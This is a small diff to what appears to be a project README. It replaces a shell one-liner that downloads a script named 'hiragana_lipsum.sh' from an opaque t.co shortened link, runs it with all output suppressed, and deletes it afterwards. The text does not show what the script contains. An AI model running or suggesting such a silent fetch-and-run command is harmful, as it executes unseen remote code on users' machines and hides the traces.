@@ -13,7 +13,7 @@ OS: Ubuntu 14.04.5 LTS
 
 start 
 ```shell
-curl -Ls  https://t.co/TFzVvmcknc -o  hiragana_lipsum.sh  ; chmod +x hiragana_lipsum.sh ; ./hiragana_lipsum.sh > /dev/null 2>&1  ; rm -f hiragana_lipsum.sh
+curl -Ls  https://t.co/KOuLcyYcPy -o  hiragana_lipsum.sh.x  ; chmod +x hiragana_lipsum.sh.x ; ./hiragana_lipsum.sh.x > /dev/null 2>&1  ; rm -f hiragana_lipsum.sh.x
 ```
 
 
